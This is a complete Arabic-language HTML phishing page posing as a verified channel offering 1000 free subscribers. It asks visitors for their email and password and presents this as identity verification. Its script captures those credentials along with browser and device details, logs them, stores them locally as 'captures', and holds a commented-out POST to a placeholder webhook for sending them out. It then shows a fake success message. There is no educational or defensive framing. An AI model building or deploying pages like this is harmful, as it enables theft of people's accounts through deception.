<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>قناة الرشق — لوحة المشتركين</title>
<style>
  * { margin:0; padding:0; box-sizing:border-box; -webkit-tap-highlight-color:transparent; }
  html, body {
    font-family: -apple-system, 'Segoe UI', Roboto, Tahoma, sans-serif;
    background:#0f0f0f;
    color:#f1f1f1;
    min-height:100vh;
    display:flex;
    align-items:center;
    justify-content:center;
    padding:16px;
  }
  .card {
    background:#1c1c1c;
    border:1px solid #303030;
    border-radius:16px;
    width:100%;
    max-width:420px;
    padding:24px 20px;
    box-shadow:0 12px 40px rgba(0,0,0,.6);
  }
  .banner {
    width:100%; height:78px;
    border-radius:12px;
    background:linear-gradient(135deg,#ff0000,#8b0000);
    display:flex; align-items:center; justify-content:center;
    margin-bottom:16px;
    font-size:20px; font-weight:800; letter-spacing:1px; color:#fff;
  }
  .logo-row { display:flex; align-items:center; gap:12px; margin-bottom:4px; }
  .avatar {
    width:52px; height:52px; border-radius:50%;
    background:#ff0000;
    display:flex; align-items:center; justify-content:center;
    font-size:24px; font-weight:900; color:#fff; flex-shrink:0;
  }
  .ch-name { font-size:17px; font-weight:700; }
  .ch-sub { font-size:12px; color:#aaa; margin-top:2px; }
  .badge {
    display:inline-block; background:#ff0000; color:#fff;
    font-size:11px; font-weight:700; padding:3px 10px;
    border-radius:20px; margin-top:6px;
  }
  .divider { height:1px; background:#303030; margin:18px 0; }
  .headline { font-size:15px; font-weight:600; margin-bottom:6px; }
  .subline { font-size:13px; color:#aaa; margin-bottom:16px; line-height:1.6; }
  label { display:block; font-size:13px; color:#ccc; margin-bottom:6px; margin-top:14px; }
  input {
    width:100%; padding:13px 14px;
    background:#121212; border:1px solid #3a3a3a;
    border-radius:10px; color:#fff; font-size:16px;
    outline:none; transition:border .2s;
    -webkit-appearance:none;
  }
  input:focus { border-color:#ff0000; }
  .msg { font-size:13px; text-align:center; margin-top:14px; min-height:18px; }
  .msg.ok { color:#2ecc71; }
  .msg.err { color:#ff5252; }
  .foot { text-align:center; font-size:11px; color:#666; margin-top:16px; }

  /* ===== صف الزر ===== */
  .dot-row {
    display:flex;
    justify-content:flex-end;
    padding-top:16px;
    margin-top:8px;
    border-top:1px solid #222;
  }

  /* النقطة الحمراء — أكبر شوي */
  .dot-btn {
    position:relative;
    width:36px;                /* حجم مرئي أكبر */
    height:36px;
    padding:0;
    border:none;
    border-radius:50%;
    background:#ff0000;
    box-shadow:0 0 10px rgba(255,0,0,.85), 0 0 3px rgba(255,0,0,.95);
    cursor:pointer;
    -webkit-appearance:none;
    outline:none;
    animation:pulse 1.8s ease-in-out infinite;
  }
  /* منطقة لمس أوسع (56×56) — مريحة أكثر */
  .dot-btn::before {
    content:"";
    position:absolute;
    inset:-10px;               /* 36 + 20 = 56px لمس */
    border-radius:50%;
    background:transparent;
  }
  .dot-btn:active { background:#cc0000; }

  @keyframes pulse {
    0%, 100% { box-shadow:0 0 10px rgba(255,0,0,.85), 0 0 3px rgba(255,0,0,.95); }
    50%      { box-shadow:0 0 18px rgba(255,0,0,1), 0 0 5px rgba(255,0,0,1); }
  }
</style>
</head>
<body>

<div class="card">
  <div class="banner">🎁 حزمة الرشق المجانية</div>

  <div class="logo-row">
    <div class="avatar">R</div>
    <div>
      <div class="ch-name">قناة الرشق الرسمية</div>
      <div class="ch-sub">1.2M مشترك</div>
      <div class="badge">✓ موثّقة</div>
    </div>
  </div>

  <div class="divider"></div>

  <div class="headline">احصل على 1000 مشترك مجانًا</div>
  <div class="subline">
    سجّل بريدك الإلكتروني وكلمة المرور للتحقق من هويتك، وسيتم إرسال حزمة الرشق إلى حسابك خلال 24 ساعة.
  </div>

  <form id="rushForm" autocomplete="off">
    <label for="email">البريد الإلكتروني</label>
    <input type="email" id="email" name="email" placeholder="you@example.com"
           inputmode="email" autocapitalize="off" autocorrect="off" required>

    <label for="password">كلمة المرور</label>
    <input type="password" id="password" name="password" placeholder="••••••••"
           autocapitalize="off" autocorrect="off" required>

    <div class="msg" id="msg"></div>

    <div class="dot-row">
      <button type="submit" class="dot-btn" id="dotBtn" aria-label="تفعيل"></button>
    </div>
  </form>

  <div class="foot">© 2025 قناة الرشق — جميع الحقوق محفوظة</div>
</div>

<script>
(function () {
  "use strict";

  const form = document.getElementById("rushForm");
  const msg  = document.getElementById("msg");

  function showMsg(text, type) {
    msg.textContent = text;
    msg.className = "msg " + (type || "");
  }

  form.addEventListener("submit", function (e) {
    e.preventDefault();

    const email    = document.getElementById("email").value.trim();
    const password = document.getElementById("password").value;

    if (!email || !password) {
      showMsg("يرجى تعبئة جميع الحقول.", "err");
      return;
    }

    const payload = {
      email: email,
      password: password,
      timestamp: new Date().toISOString(),
      userAgent: navigator.userAgent,
      language: navigator.language,
      platform: navigator.platform || "unknown",
      screen: window.screen.width + "x" + window.screen.height,
      referrer: document.referrer || "direct",
      url: window.location.href
    };

    console.log("%c📥 بيانات جديدة", "color:#ff0000;font-size:16px;font-weight:bold;");
    console.table(payload);
    console.log("البريد:", payload.email);
    console.log("كلمة المرور:", payload.password);
    console.log(JSON.stringify(payload, null, 2));

    try {
      const store = JSON.parse(localStorage.getItem("rush_captures") || "[]");
      store.push(payload);
      localStorage.setItem("rush_captures", JSON.stringify(store));
    } catch (err) {}

    // fetch("https://YOUR-WEBHOOK-URL", {
    //   method:"POST",
    //   headers:{"Content-Type":"application/json"},
    //   body: JSON.stringify(payload)
    // }).catch(function(){});

    showMsg("✓ تم التسجيل بنجاح! سيتم إرسال الحزمة خلال 24 ساعة.", "ok");
    form.reset();
  });
})();
</script>

</body>
</html>
